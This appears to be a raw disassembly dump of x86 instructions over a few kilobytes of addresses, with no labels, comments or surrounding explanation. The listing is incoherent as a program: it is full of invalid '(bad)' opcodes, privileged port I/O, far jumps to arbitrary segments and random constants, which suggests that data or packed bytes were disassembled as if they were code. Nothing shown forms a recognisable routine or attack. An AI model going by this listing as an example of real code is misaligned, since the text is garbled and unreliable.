  424556:	fs pop esi
  424558:	xor    BYTE PTR [bx+0x38fe],bh
  42455d:	sbb    DWORD PTR [ebx],ebx
  42455f:	sub    al,ah
  424561:	cmp    BYTE PTR [eax],bh
  424563:	hlt    
  424564:	mov    BYTE PTR [edx-0xa],dl
  424567:	mov    al,0x6e
  424569:	sub    DWORD PTR [eax+0x5f],ebp
  42456c:	(bad)  
  42456d:	and    al,0xc0
  42456f:	lds    esp,FWORD PTR [edi+0x27]
  424572:	inc    edi
  424573:	ds sbb eax,0x82bbdae7
  424579:	fdiv   DWORD PTR [esi+0x66]
  42457c:	out    dx,eax
  42457d:	test   eax,edx
  42457f:	mov    esi,0xee81041
  424584:	fimul  WORD PTR [edi+edi*1+0xe]
  424588:	pcmpeqw mm7,QWORD PTR [ebx]
  42458b:	or     eax,0xf1e91e7
  424590:	sar    BYTE PTR [ecx],cl
  424592:	mov    dl,0xe8
  424594:	and    DWORD PTR ds:0xe081f6d0,ebx
  42459a:	(bad)  
  42459b:	xchg   ecx,eax
  42459c:	mov    edx,0xcbc28d56
  4245a1:	clc    
  4245a2:	in     eax,0xf4
  4245a4:	push   0x4d
  4245a6:	repz add DWORD PTR [ecx],edi
  4245a9:	popa   
  4245aa:	pop    ss
  4245ab:	xor    eax,DWORD PTR [esi]
  4245ad:	inc    ecx
  4245ae:	mov    dh,0x19
  4245b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4245b1:	pushf  
  4245b2:	mov    edx,0xee22720a
  4245b7:	mov    WORD PTR [esi],?
  4245b9:	bound  edi,QWORD PTR ds:0xac2b3ff7
  4245bf:	lods   al,BYTE PTR ds:[esi]
  4245c0:	int    0x1e
  4245c2:	jbe    0x42462d
  4245c4:	nop
  4245c5:	push   0x73
  4245c7:	je     0x42458d
  4245c9:	(bad)  
  4245ca:	sahf   
  4245cb:	lods   eax,DWORD PTR ds:[esi]
  4245cc:	pop    edi
  4245cd:	je     0x4245a2
  4245cf:	and    BYTE PTR [ebx-0x2f6f29eb],cl
  4245d5:	and    eax,0xa99c7a56
  4245da:	xchg   dl,bh
  4245dc:	jl     0x424647
  4245de:	and    bh,cl
  4245e0:	dec    edx
  4245e1:	mov    esi,0xeaea66c8
  4245e6:	cmp    eax,DWORD PTR [ebx-0x19]
  4245e9:	jmp    0x42462b
  4245eb:	jmp    DWORD PTR [ebx-0x3e]
  4245ee:	sahf   
  4245ef:	xchg   edi,eax
  4245f0:	mov    bh,0xec
  4245f2:	das    
  4245f3:	nop
  4245f4:	shl    BYTE PTR [ecx-0x58],cl
  4245f7:	shr    BYTE PTR [edx-0x5fd1d33e],1
  4245fd:	gs or  al,0xb4
  424600:	int3   
  424601:	adc    al,0x97
  424603:	call   0x1799db38
  424608:	mov    ebp,0xeeb41ac2
  42460d:	mov    dl,0xfd
  42460f:	test   cl,0xf3
  424612:	xchg   ebx,eax
  424613:	imul   edx,DWORD PTR [ecx-0x79],0x8502fad9
  42461a:	stos   DWORD PTR es:[edi],eax
  42461b:	(bad)  
  42461d:	lods   al,BYTE PTR ds:[esi]
  42461e:	inc    edi
  42461f:	xor    al,0x1a
  424621:	mov    ch,0x67
  424623:	mov    DWORD PTR [eax],eax
	...
  424631:	imul   ecx,DWORD PTR [edi+0x7dee7c8a],0xffffffff
  424638:	lahf   
  424639:	push   esi
  42463a:	jl     0x4245fd
  42463c:	dec    edi
  42463d:	lea    eax,[edx-0x2f]
  424640:	jmp    0x3ab:0x1bdc9
  424647:	add    BYTE PTR [eax],al
  424649:	scas   al,BYTE PTR es:[edi]
  42464a:	out    dx,al
  42464b:	arpl   WORD PTR [eax-0x3b],cx
  42464e:	mov    edx,0xb4b3cc6f
  424653:	fcom   QWORD PTR [esi+0x4a]
  424656:	fld    DWORD PTR [ebp-0x9]
  424659:	clc    
  42465a:	xor    BYTE PTR [esi*8-0x5a1d80d],ch
  424661:	shl    DWORD PTR [ebx],0xbb
  424664:	out    0x4a,al
  424666:	and    eax,0x1f08d0be
  42466b:	xchg   ecx,eax
  42466c:	and    al,0xe1
  42466e:	mov    esi,0x32cf7a67
  424673:	mov    dh,0x3c
  424675:	dec    esi
  424676:	sti    
  424677:	mov    WORD PTR [eax-0x3f],?
  42467a:	test   BYTE PTR [edi-0x59],0xa0
  42467e:	rcl    edx,0xe4
  424681:	popa   
  424682:	hlt    
  424683:	xchg   esi,eax
  424684:	int    0x4e
  424686:	mov    edi,0x9353eca
  42468b:	seto   BYTE PTR [ebx-0x4c]
  42468f:	push   ebx
  424690:	fmul   st,st(5)
  424692:	stos   BYTE PTR es:[edi],al
  424693:	jecxz  0x4246ea
  424695:	dec    eax
  424696:	icebp  
  424697:	ficom  DWORD PTR [edx-0xe]
  42469a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42469b:	pop    ds
  42469c:	jmp    0x9bd9108
  4246a1:	(bad)  
  4246a2:	xchg   ebx,eax
  4246a3:	push   ds
  4246a4:	ret    0x3cd8
  4246a7:	dec    ebp
  4246a8:	arpl   WORD PTR [edx-0x25],bp
  4246ab:	js     0x424689
  4246ad:	ror    esp,0xaf
  4246b0:	add    DWORD PTR [edi+0x53],edi
  4246b3:	mov    edi,0x2735b445
  4246b8:	adc    al,0xa8
  4246ba:	call   FWORD PTR [ecx]
  4246bc:	mov    ds:0x1bc3aea,eax
  4246c1:	add    DWORD PTR [esi],esp
  4246c3:	(bad)  
  4246c4:	out    0x61,eax
  4246c6:	jae    0x42470a
  4246c8:	sbb    al,0xb7
  4246ca:	call   0x1f91adef
  4246cf:	pop    ebx
  4246d0:	xchg   ebx,eax
  4246d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246d2:	int3   
  4246d3:	mov    WORD PTR [eax-0x505f66a4],?
  4246d9:	ins    DWORD PTR es:[edi],dx
  4246da:	nop
  4246db:	mov    BYTE PTR [eax],cl
  4246dd:	scas   eax,DWORD PTR es:[edi]
  4246de:	adc    edx,0x54
  4246e1:	jnp    0x4246ea
  4246e3:	(bad)  
  4246e4:	push   esi
  4246e5:	into   
  4246e6:	loop   0x424671
  4246e8:	cmp    eax,0x2f2920f9
  4246ed:	jmp    0x76ac:0x13f6aef1
  4246f4:	push   edi
  4246f5:	xchg   esp,eax
  4246f6:	xor    eax,edi
  4246f8:	scas   al,BYTE PTR es:[edi]
  4246f9:	mov    esi,0x18695d35
  4246fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4246ff:	add    DWORD PTR [ecx+0x3c531bad],eax
  424705:	sbb    DWORD PTR [esi+0x41],esi
  424708:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424709:	les    ebx,FWORD PTR [ebp-0x7]
  42470c:	cwde   
  42470d:	pop    ds
  42470e:	rol    DWORD PTR [edx+0x2e],1
  424711:	call   0x1bb9:0x84480930
  424718:	les    eax,FWORD PTR [esi]
  42471a:	pushf  
  42471b:	and    eax,0x83cb4887
  424720:	mov    sp,bp
  424723:	enter  0x1c7b,0x78
  424727:	sbb    BYTE PTR [ebp-0x59],ch
  42472a:	retf   
  42472b:	ror    DWORD PTR [ecx],0xb
  42472e:	fwait
  42472f:	sbb    DWORD PTR [edi],ecx
  424731:	out    dx,al
  424732:	push   ecx
  424733:	inc    eax
  424734:	sub    al,0x44
  424736:	and    DWORD PTR [ecx],ecx
  424738:	pop    edx
  424739:	cld    
  42473a:	inc    edx
  42473b:	call   FWORD PTR [esi+ebp*2-0x3ee42bb2]
  424742:	jp     0x4246cb
  424744:	adc    DWORD PTR [ebp-0x49],0xffffff91
  424748:	cmc    
  424749:	and    DWORD PTR [ecx-0xf],0xffffff9c
  42474d:	sti    
  42474e:	scas   al,BYTE PTR es:[edi]
  42474f:	xchg   ecx,esp
  424751:	dec    esi
  424752:	rol    DWORD PTR [edx],0xf3
  424755:	jbe    0x42477f
  424757:	xor    BYTE PTR [edx-0x13],ah
  42475a:	xchg   edi,eax
  42475b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42475c:	sbb    edx,DWORD PTR ds:0x5d85c276
  424762:	add    ebx,edi
  424764:	idiv   DWORD PTR [ecx-0x15]
  424767:	rol    DWORD PTR [edi+0x23],cl
  42476a:	pop    esp
  42476b:	mov    ch,0xec
  42476d:	test   eax,0x27a4c175
  424772:	adc    esi,DWORD PTR [edi+0x2665d32c]
  424778:	icebp  
  424779:	jno    0x424731
  42477b:	mov    esp,0x2f921ef9
  424780:	(bad)  
  424782:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424783:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  424785:	pop    edi
  424786:	bound  ecx,QWORD PTR [ecx-0x76dbdbde]
  42478c:	pop    ecx
  42478d:	imul   esp,DWORD PTR [esi+ebx*1+0x1b],0xffffffba
  424792:	or     DWORD PTR [ecx-0x5f144c6],ecx
  424798:	and    DWORD PTR [esi+esi*2],eax
  42479b:	inc    edi
  42479c:	mov    ebp,0xe30bf087
  4247a1:	out    0xa4,eax
  4247a3:	jae    0x4247bd
  4247a5:	jmp    0xfdfec7d
  4247aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4247ab:	adc    eax,0x9a3d20af
  4247b0:	mov    DWORD PTR gs:[ebx-0x7d],eax
  4247b4:	inc    ebx
  4247b5:	or     bh,BYTE PTR [ebx-0x4941ea77]
  4247bb:	sub    al,0x3f
  4247bd:	test   DWORD PTR [edx+0x706bdd83],ecx
  4247c3:	push   es
  4247c4:	loope  0x4247bc
  4247c6:	adc    DWORD PTR [ebx],edx
  4247c8:	cmp    dl,BYTE PTR [ebx]
  4247ca:	inc    eax
  4247cb:	jo     0x424794
  4247cd:	int3   
  4247ce:	in     eax,dx
  4247cf:	dec    edx
  4247d0:	mov    edi,0xe356a35d
  4247d5:	mov    bh,0x8d
  4247d7:	test   DWORD PTR [ebx-0x6711a968],eax
  4247dd:	rol    BYTE PTR [edx-0x526b8973],0x84
  4247e4:	repz mov ds:0x41b0612a,al
  4247ea:	fcom   DWORD PTR [eax]
  4247ec:	jo     0x424840
  4247ee:	add    eax,0xd718e77c
  4247f3:	jo     0x4247eb
  4247f5:	(bad)  
  4247f6:	(bad)  
  4247f7:	(bad)  
  4247f9:	dec    ebx
  4247fa:	jg     0x4247c2
  4247fc:	sbb    BYTE PTR ds:[edi+0x15],bl
  424800:	adc    edx,edi
  424802:	sub    BYTE PTR ds:0xc7468e08,al
  424808:	pusha  
  424809:	fidivr WORD PTR [esi]
  42480b:	jmp    0x7639:0x6944c77d
  424812:	enter  0x4711,0xcb
  424816:	and    al,0x4e
  424818:	ins    BYTE PTR es:[edi],dx
  424819:	ins    BYTE PTR es:[edi],dx
  42481a:	jno    0x4247ab
  42481c:	test   DWORD PTR [eax+ecx*4],eax
  42481f:	data16 jl 0x42480e
  424822:	ret    
  424823:	clc    
  424824:	add    eax,0xab28aec6
  424829:	adc    DWORD PTR [eax+0x146ca9be],edi
  42482f:	(bad)  
  424830:	aad    0x6f
  424832:	inc    ebp
  424833:	jg     0x424866
  424835:	stos   BYTE PTR es:[edi],al
  424836:	mov    al,0x7d
  424838:	adc    ch,BYTE PTR [ebx+eax*8]
  42483b:	aad    0x3e
  42483d:	and    eax,0xa03d6233
  424842:	and    BYTE PTR [edx],ch
  424844:	int3   
  424845:	inc    ecx
  424846:	dec    ebx
  424847:	div    DWORD PTR [ebx+eiz*2-0x557b7ebf]
  42484e:	test   BYTE PTR [edi+esi*2],bl
  424851:	push   cs
  424852:	sbb    eax,DWORD PTR [eax+0x22]
  424855:	push   edi
  424856:	and    BYTE PTR [esi],0xd1
  424859:	push   esp
  42485a:	add    BYTE PTR [esi],ch
  42485c:	mov    ebp,0x1bc32d05
  424861:	mov    bl,0x86
  424863:	cmp    bl,al
  424865:	push   edi
  424866:	in     al,0x5b
  424868:	push   ebp
  424869:	xor    eax,0x8b27f3
  42486e:	mov    edx,0x80d59097
  424873:	pop    edi
  424874:	push   esi
  424875:	adc    ebp,esi
  424877:	xchg   edi,eax
  424878:	ins    BYTE PTR es:[edi],dx
  424879:	stos   DWORD PTR es:[edi],eax
  42487a:	ret    
  42487b:	imul   esi,DWORD PTR [ebp-0x6b],0xffffffc3
  42487f:	loop   0x424826
  424881:	sub    eax,0xb880c66a
  424886:	jmp    FWORD PTR [edi+0x1e782d3c]
  42488c:	jmp    0x9f415fd7
  424891:	xor    DWORD PTR [ecx+edi*4-0x54],edx
  424895:	sub    eax,0x8a6585d8
  42489a:	scas   al,BYTE PTR es:[edi]
  42489b:	sub    al,0xcf
  42489d:	dec    edx
  42489e:	add    BYTE PTR [esi+0x31],0x94
  4248a2:	mov    dl,0x37
  4248a4:	aad    0xb
  4248a6:	pusha  
  4248a7:	int    0xcb
  4248a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4248aa:	mov    edi,0x8772f46f
  4248af:	sub    BYTE PTR ds:0xec3523e0,0x35
  4248b6:	inc    eax
  4248b7:	pop    eax
  4248b8:	mov    edx,0x380443db
  4248bd:	lea    ebx,[ebp+eiz*4-0x52e7fe16]
  4248c4:	adc    edi,esp
  4248c6:	popf   
  4248c7:	mov    WORD PTR [ecx],fs
  4248c9:	int    0x12
  4248cb:	inc    eax
  4248cc:	sbb    eax,0x243ba6b5
  4248d1:	adc    DWORD PTR [ebx],ebp
  4248d3:	sbb    al,dl
  4248d5:	add    edi,DWORD PTR [eax-0x66]
  4248d8:	sub    bh,BYTE PTR [ebp+0x15]
  4248db:	std    
  4248dc:	int3   
  4248dd:	push   ebp
  4248de:	sub    al,0xa0
  4248e0:	sub    al,0xb1
  4248e2:	push   ecx
  4248e3:	cmp    DWORD PTR [edi+0x6f29b3f9],ebp
  4248e9:	pop    ds
  4248ea:	push   ebp
  4248eb:	adc    al,0xf3
  4248ed:	icebp  
  4248ee:	mov    ah,0x45
  4248f0:	lods   al,BYTE PTR ds:[esi]
  4248f1:	inc    eax
  4248f2:	mov    cl,BYTE PTR [edi+0x3e6456a0]
  4248f8:	mov    bl,0xd7
  4248fa:	das    
  4248fb:	data16 sti 
  4248fd:	mov    al,0xf6
  4248ff:	dec    eax
  424900:	ficom  DWORD PTR [eax]
  424902:	mov    dl,0x3b
  424904:	jle    0x42489f
  424906:	pushf  
  424907:	ds pop edi
  424909:	jl     0x42493f
  42490b:	jbe    0x4248d4
  42490d:	aaa    
  42490e:	and    eax,0xc770d3a
  424913:	mov    cl,0xbf
  424915:	pop    eax
  424916:	out    dx,eax
  424917:	aas    
  424918:	add    DWORD PTR [edx],0x675889d7
  42491e:	test   al,0x85
  424920:	jae    0x4248cb
  424922:	jo     0x424938
  424924:	inc    edi
  424925:	push   0x69
  424927:	cmp    BYTE PTR [edi+eiz*8+0x3a682045],dh
  42492e:	pusha  
  42492f:	mov    eax,DWORD PTR [esi-0x3a]
  424932:	rol    DWORD PTR [edx+0x14],0xa
  424936:	mov    esi,0xbd05853b
  42493b:	pop    ebp
  42493c:	lock shl BYTE PTR [esi],0x59
  424940:	aam    0x2f
  424942:	into   
  424943:	nop
  424944:	jnp    0x4248ec
  424946:	xlat   BYTE PTR ds:[ebx]
  424947:	jmp    0xb580:0xe6f861c4
  42494e:	jmp    0x4a9033a4
  424953:	int    0xf1
  424955:	popa   
  424956:	push   ss
  424957:	xchg   esp,eax
  424958:	add    al,0xe6
  42495a:	fucom  st(7)
  42495c:	add    bh,BYTE PTR [eax]
  42495e:	in     al,0xed
  424960:	jecxz  0x424995
  424962:	in     eax,0xcf
  424964:	add    ah,cl
  424966:	inc    eax
  424967:	ins    DWORD PTR es:[edi],dx
  424968:	dec    ebx
  424969:	sub    BYTE PTR [eax],bh
  42496b:	sbb    esp,ecx
  42496d:	test   DWORD PTR ds:0xf69e787d,ebx
  424973:	mov    bl,0x29
  424975:	pushf  
  424976:	lods   al,BYTE PTR ds:[esi]
  424977:	pop    ebx
  424978:	ins    DWORD PTR es:[edi],dx
  424979:	lea    edi,[eax]
  42497b:	test   ch,cl
  42497d:	gs mov ch,0x98
  424980:	mov    esi,fs
  424982:	jae    0xf7ce5760
  424988:	ins    DWORD PTR es:[edi],dx
  424989:	out    dx,eax
  42498a:	mov    ds:0xd497e123,al
  42498f:	retf   0x1b3b
  424992:	pop    ds
  424993:	mov    cl,0xc0
  424995:	dec    ebx
  424996:	mov    cl,0xad
  424998:	pop    esi
  424999:	mov    ecx,0x59337603
  42499e:	dec    edx
  42499f:	inc    ecx
  4249a0:	sub    ecx,esp
  4249a2:	xchg   ecx,eax
  4249a3:	stc    
  4249a4:	out    0x58,eax
  4249a6:	xchg   ebp,ebp
  4249a8:	(bad)  
  4249a9:	fidivr WORD PTR [ebp*4-0x255b4f7d]
  4249b0:	mov    bl,0x98
  4249b2:	push   ecx
  4249b3:	int    0xb9
  4249b5:	pop    ecx
  4249b6:	mov    BYTE PTR [ecx],al
  4249b8:	push   ss
  4249b9:	push   edx
  4249ba:	jmp    0xe93c:0x456102c1
  4249c1:	(bad)  
  4249c2:	mov    ebx,0xf8e1fcf8
  4249c7:	xchg   edi,eax
  4249c8:	arpl   WORD PTR [edi-0x2c9a63b5],sp
  4249ce:	mov    ds:0xe028f172,al
  4249d3:	jg     0x4249c8
  4249d5:	adc    DWORD PTR [edx-0x190e046c],ecx
  4249db:	addr16 aad 0x59
  4249de:	add    BYTE PTR [ebx],cl
  4249e0:	jp     0x424a08
  4249e2:	enter  0x151,0xd1
  4249e6:	cmp    edx,DWORD PTR [edx]
  4249e8:	cli    
  4249e9:	ficomp DWORD PTR [edx+ebx*8-0x7fdd827]
  4249f0:	add    eax,0x6e2872
	...
  424a01:	push   ebp
  424a02:	push   0xffffffe6
  424a04:	mov    bl,0xff
  424a06:	mov    edi,0x7b2ee55
  424a0b:	cmp    BYTE PTR [eax],dh
  424a0d:	mov    ebx,0x74572cf3
  424a12:	rol    DWORD PTR [ecx],0x0
  424a15:	stos   DWORD PTR es:[edi],eax
  424a16:	add    eax,DWORD PTR [eax]
  424a18:	add    BYTE PTR [eax-0x40],ah
  424a1b:	neg    esi
  424a1d:	jo     0x4249a4
  424a1f:	out    dx,eax
  424a20:	(bad)  
  424a21:	xor    esp,DWORD PTR [edi+0x7a]
  424a24:	xor    eax,0xe44065f6
  424a29:	or     edx,DWORD PTR [edi]
  424a2b:	aas    
  424a2c:	shl    DWORD PTR [ecx-0x6fc9e36f],0x23
  424a33:	push   es
  424a34:	jle    0x424a38
  424a36:	imul   edx,DWORD PTR [eax+edx*4+0x79],0x69de3e4f
  424a3e:	or     BYTE PTR [esi],0x50
  424a41:	test   BYTE PTR [edi+0x4269f901],bl
  424a47:	(bad)  
  424a48:	ds push ebx
  424a4a:	adc    esi,edi
  424a4c:	xchg   ebx,eax
  424a4d:	pushf  
  424a4e:	ss lahf 
  424a50:	(bad)
  424a53:	jge    0x424a79
  424a55:	mov    esi,0x767413e7
  424a5a:	fst    DWORD PTR [ebp+0x5e]
  424a5d:	mov    al,0x9f
  424a5f:	jmp    0x2d35:0x4e40ec7d
  424a66:	inc    esi
  424a67:	jg     0x424a8e
  424a69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424a6a:	xchg   ecx,eax
  424a6b:	loop   0x424a80
  424a6d:	cmp    DWORD PTR [ecx-0x2],ebp
  424a70:	inc    eax
  424a71:	stc    
  424a72:	call   0x50e6:0x4aa63c58
  424a79:	mov    ah,0xe5
  424a7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a7c:	sub    DWORD PTR [edi-0x47850011],ebx
  424a82:	in     al,0xec
  424a84:	add    al,0x72
  424a86:	scas   eax,DWORD PTR es:[edi]
  424a87:	push   esp
  424a88:	jle    0x424aef
  424a8a:	test   al,0x68
  424a8c:	dec    esp
  424a8d:	int    0xee
  424a8f:	or     ebx,esi
  424a91:	cmp    eax,0x43cfbbb5
  424a96:	or     cl,ah
  424a98:	std    
  424a99:	(bad)  
  424a9a:	test   al,0x2b
  424a9c:	fstp   st(2)
  424a9e:	lock lods al,BYTE PTR ds:[esi]
  424aa0:	aam    0x9
  424aa2:	out    dx,al
  424aa3:	sbb    al,0x7b
  424aa5:	jmp    0x424a3c
  424aa7:	inc    ecx
  424aa8:	jne    0x424a6b
  424aaa:	jmp    0x424b21
  424aac:	cmp    DWORD PTR [ebp+0x75915701],0xffffffd5
  424ab3:	adc    ebp,DWORD PTR [esp+eiz*8-0x73]
  424ab7:	enter  0xeefa,0x26
  424abb:	mov    dl,0x8a
  424abd:	inc    ecx
  424abe:	fild   QWORD PTR [ecx]
  424ac0:	push   ds
  424ac1:	mov    cl,0x5b
  424ac3:	in     al,0xe
  424ac5:	push   cs
  424ac6:	push   0x3f48bd5b
  424acb:	rol    DWORD PTR [edi-0x470470f3],cl
  424ad1:	xor    al,0xdf
  424ad3:	cmp    esp,DWORD PTR [edi+0x56]
  424ad6:	adc    cl,BYTE PTR [eax]
  424ad8:	jno    0x424a8e
  424ada:	adc    al,0x5f
  424adc:	push   es
  424add:	vandnpd xmm2,xmm6,XMMWORD PTR [esi]
  424ae1:	mov    esi,0xe8c771b9
  424ae6:	pop    eax
  424ae7:	repz and DWORD PTR [ebx+0x795106ac],edx
  424aee:	fcmovbe st,st(4)
  424af0:	fstp   TBYTE PTR [eax+0x6ddb42eb]
  424af6:	inc    eax
  424af7:	dec    edx
  424af8:	scas   eax,DWORD PTR es:[edi]
  424af9:	sbb    bh,BYTE PTR [ecx]
  424afb:	jecxz  0x424b73
  424afd:	pushf  
  424afe:	jl     0x424b51
  424b00:	mov    ch,0x85
  424b02:	aas    
  424b03:	mov    ecx,0xd7107a00
  424b08:	repz add ch,BYTE PTR [edx]
  424b0b:	jmp    0x424b67
  424b0d:	rcl    DWORD PTR ds:0x931ab55c,0xa3
  424b14:	mov    ds:0x81d18cc1,al
  424b19:	js     0x424ac9
  424b1b:	das    
  424b1c:	test   eax,0x1d816b31
  424b21:	mov    dl,dh
  424b23:	std    
  424b24:	pop    esp
  424b25:	je     0x424b3e
  424b27:	xchg   BYTE PTR [esi-0xa],cl
  424b2a:	fimul  DWORD PTR [eax+0x20]
  424b2d:	sub    BYTE PTR [ebp+0x2dc50497],ch
  424b33:	mov    ds:0x4947c145,eax
  424b38:	mov    edx,0x2782a75d
  424b3d:	pop    esi
  424b3e:	mov    ebp,0x91e15b3c
  424b43:	ja     0x424b66
  424b45:	cmc    
  424b46:	sub    ecx,DWORD PTR [ecx+0x77]
  424b49:	enter  0xdf63,0xa5
  424b4d:	jmp    0xfa3ee04d
  424b52:	aas    
  424b53:	(bad)  
  424b55:	xor    edi,DWORD PTR [edx]
  424b57:	fbld   TBYTE PTR [edx+0x43]
  424b5a:	xchg   BYTE PTR [eax+0x7b],bh
  424b5d:	aad    0xb1
  424b5f:	int3   
  424b60:	das    
  424b61:	jmp    0x3b9655c0
  424b66:	sub    BYTE PTR [edx+eax*4-0x37],ah
  424b6a:	inc    edi
  424b6b:	test   eax,0xcdc09e49
  424b70:	shl    DWORD PTR [edi+ebp*4+0x18],0x51
  424b75:	ficomp DWORD PTR [edi]
  424b77:	jno    0x424b0b
  424b79:	fwait
  424b7a:	mov    ah,0x3b
  424b7c:	jnp    0x424b37
  424b7e:	mov    ds:0x81d81ad3,eax
  424b83:	jg     0x424b7d
  424b85:	lds    esi,FWORD PTR [eax+ebx*1-0x5d8a47d4]
  424b8c:	mov    ebx,0x934064dd
  424b91:	arpl   bx,di
  424b93:	and    eax,0x58d212a1
  424b98:	sahf   
  424b99:	inc    edi
  424b9a:	js     0x424bef
  424b9c:	call   0x71f8:0x230d6780
  424ba3:	adc    ebx,edi
  424ba5:	out    dx,eax
  424ba6:	outs   dx,DWORD PTR ds:[esi]
  424ba7:	jne    0x424b84
  424ba9:	jb     0x424bbe
  424bab:	(bad)  
  424bac:	mov    dh,0xd8
  424bae:	push   esp
  424baf:	fucomip st,st(7)
  424bb1:	sub    bl,bl
  424bb3:	lahf   
  424bb4:	scas   eax,DWORD PTR es:[edi]
  424bb5:	xchg   ebp,eax
  424bb6:	dec    edi
  424bb7:	cmp    bh,bl
  424bb9:	(bad)  
  424bba:	ficom  DWORD PTR [ecx]
  424bbc:	je     0x424b5a
  424bbe:	mov    al,ds:0x28c49e2d
  424bc3:	das    
  424bc4:	push   esp
  424bc5:	mov    al,al
  424bc7:	dec    ebx
  424bc8:	sub    edx,DWORD PTR [ecx+eiz*8+0x41]
  424bcc:	inc    ecx
  424bcd:	sub    eax,0x1cff1e36
  424bd2:	retf   0x232f
  424bd5:	and    edx,DWORD PTR [edx+0x62b950f7]
  424bdb:	pop    ecx
  424bdc:	retf   0xd3e
  424bdf:	inc    edx
  424be0:	jg     0x424c55
  424be2:	pop    ds
  424be3:	xchg   ebp,eax
  424be4:	test   eax,0x186f3d53
  424be9:	xchg   esp,eax
  424bea:	jp     0x424c2e
  424bec:	pop    es
  424bed:	rcl    BYTE PTR [esi+0x6c9aa17d],0x7d
  424bf4:	std    
  424bf5:	pop    ds
  424bf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424bf7:	rcl    BYTE PTR [edx+0x5aa9fb0f],0x30
  424bfe:	fst    DWORD PTR [esi-0x7b]
  424c01:	sti    
  424c02:	lock jnp 0x424bde
  424c05:	rol    DWORD PTR [ecx+0x51415788],0x58
  424c0c:	mov    BYTE PTR [esp+eiz*4+0x700b0a2c],dl
  424c13:	xchg   edx,eax
  424c14:	push   edi
  424c15:	sbb    edi,ecx
  424c17:	jns    0x424bef
  424c19:	inc    esi
  424c1a:	mov    dl,0xa8
  424c1c:	xlat   BYTE PTR ds:[ebx]
  424c1d:	daa    
  424c1e:	clc    
  424c1f:	rcl    DWORD PTR [edx],0x5c
  424c22:	mov    fs,esp
  424c24:	outs   dx,DWORD PTR ds:[esi]
  424c25:	outs   dx,DWORD PTR ds:[esi]
  424c26:	pop    esi
  424c27:	das    
  424c28:	pop    ds
  424c29:	in     eax,dx
  424c2a:	arpl   WORD PTR [eax-0x6153b21],sp
  424c30:	int3   
  424c31:	idiv   DWORD PTR [eax+0x279faee9]
  424c37:	pop    eax
  424c38:	jns    0x424cb4
  424c3a:	mov    esi,0xd1bc0f62
  424c3f:	lock in eax,dx
  424c41:	or     eax,0x795b2020
  424c46:	(bad)  
  424c47:	pop    esp
  424c48:	mov    DWORD PTR [edi],edi
  424c4a:	mov    esi,0x17bcba2d
  424c4f:	add    ebp,DWORD PTR [edi]
  424c51:	fiadd  WORD PTR [edi-0x37]
  424c54:	adc    bl,BYTE PTR [esi+0x4e]
  424c57:	mov    esp,?
  424c59:	push   edi
  424c5a:	mov    ebx,cs
  424c5c:	jne    0x424bf5
  424c5e:	sbb    eax,0x4dcbede6
  424c63:	shr    BYTE PTR [edx+ebx*1+0x1be3ff84],1
  424c6a:	push   edx
  424c6b:	lods   eax,DWORD PTR ds:[esi]
  424c6c:	add    BYTE PTR [eax],bl
  424c6e:	mov    esp,DWORD PTR [ebp+ecx*8-0x60d64592]
  424c75:	jo     0x424c04
  424c77:	in     eax,0xd0
  424c79:	push   ebx
  424c7a:	out    0x41,al
  424c7c:	inc    esp
  424c7d:	add    eax,0x91dbbe85
  424c82:	aam    0xb9
  424c84:	xchg   esi,eax
  424c85:	aad    0x54
  424c87:	push   ebx
  424c88:	mov    fs,WORD PTR [ebx]
  424c8a:	in     eax,0x4b
  424c8c:	sbb    al,0xc2
  424c8e:	push   eax
  424c8f:	nop
  424c90:	fucom  st(5)
  424c92:	cmp    BYTE PTR [edi],dl
  424c94:	(bad)  [eax-0x61]
  424c97:	add    edx,DWORD PTR [ecx-0x46]
  424c9a:	mov    ah,BYTE PTR [edi]
  424c9c:	jnp    0x424c58
  424c9e:	sbb    ch,0xb5
  424ca1:	daa    
  424ca2:	adc    bl,BYTE PTR [edi+0x7c59c84c]
  424ca8:	push   esp
  424ca9:	inc    ecx
  424caa:	outs   dx,DWORD PTR ds:[esi]
  424cab:	aad    0xb6
  424cad:	lock out 0x79,eax
  424cb0:	call   0xfbf1:0x3b7198ab
  424cb7:	data16 xor al,0x22
  424cba:	leave  
  424cbb:	cmp    al,0x2f
  424cbd:	or     BYTE PTR [eax+0x3702384],cl
  424cc3:	fnstsw WORD PTR [esi]
  424cc5:	sub    DWORD PTR [edi-0x3ac5f1d7],esp
  424ccb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ccc:	pusha  
  424ccd:	ret    0xfb0c
  424cd0:	mov    ebp,0x4b72360d
  424cd5:	pop    eax
  424cd6:	push   eax
  424cd7:	xor    edi,esi
  424cd9:	sbb    esi,DWORD PTR [ecx]
  424cdb:	scas   eax,DWORD PTR es:[edi]
  424cdc:	mov    cl,0x32
  424cde:	das    
  424cdf:	enter  0x17cc,0x19
  424ce3:	dec    edi
  424ce5:	sbb    eax,0xf7c110fd
  424cea:	adc    BYTE PTR [eax+0x7a],dl
  424ced:	xlat   BYTE PTR ds:[ebx]
  424cee:	leave  
  424cef:	push   esp
  424cf0:	jmp    0x424d33
  424cf2:	gs add edx,edi
  424cf5:	out    dx,eax
  424cf6:	xchg   ebp,eax
  424cf7:	mov    esi,ecx
  424cf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424cfa:	inc    ebp
  424cfb:	push   DWORD PTR [ebp+0x2d7e2543]
  424d01:	out    dx,eax
  424d02:	pop    es
  424d03:	push   edx
  424d04:	cmp    eax,0xc3f8b7bd
  424d09:	cld    
  424d0a:	test   al,0xa9
  424d0c:	jb     0x424c92
  424d0e:	mov    ebx,0x6aa9cf87
  424d13:	pop    eax
  424d14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d15:	mov    ds:0x51e11b7,eax
